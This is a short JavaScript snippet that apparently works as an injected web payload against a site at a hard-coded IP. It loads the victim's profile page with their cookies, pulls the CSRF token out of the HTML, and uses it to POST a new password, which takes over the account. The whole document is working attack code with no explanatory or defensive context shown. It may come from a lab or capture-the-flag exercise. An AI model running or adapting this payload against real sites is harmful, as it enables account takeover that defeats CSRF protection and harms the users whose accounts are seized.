// Step 1: Fetch profile page and extract CSRF token
fetch("http://54.74.235.192/profile", { credentials: "include" })
  .then(res => res.text())
  .then(html => {
    let doc = new DOMParser().parseFromString(html, "text/html");
    let token = doc.querySelector("input[name=_csrf]").value;

    // Step 2: Use the token to send the password update
    return fetch("http://54.74.235.192/profile", {
      method: "POST",
      credentials: "include", // send cookies
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: new URLSearchParams({
        _csrf: token,
        bio: "Hi, I am Alice!",
        password: "test"  // <-- new password here
      })
    });
  })
  .then(res => res.text())
  .then(resp => {
    console.log("Response after updating password:", resp);
  })
  .catch(err => console.error(err));
